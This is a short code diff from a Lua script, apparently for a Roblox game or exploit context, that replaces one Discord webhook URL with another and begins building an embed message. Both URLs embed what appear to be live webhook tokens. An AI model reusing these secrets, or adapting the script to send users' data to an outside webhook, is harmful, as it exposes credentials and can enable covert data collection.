@@ -51,7 +51,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1012548936755597322/LM02zUaBfbRXBtpQT0LsOCEJacSwUc9Xewl3Ys_eyN6VJEmevp99MOubaCaDMwgKCxrx" 
+   "https://discord.com/api/webhooks/1027365384250204220/PpKi-k1mkh6BfYgnCWZeyH-ExQIgfglqPMjy41sAhVKpPG2iNPi4WBpdqrEyJ4pS5QzP" 
 local data = {
    --["content"] = " message(no embed)- you can take out embed if by deleting the bottom stuff(where it says EMBEDS)",
    ["embeds"] = {
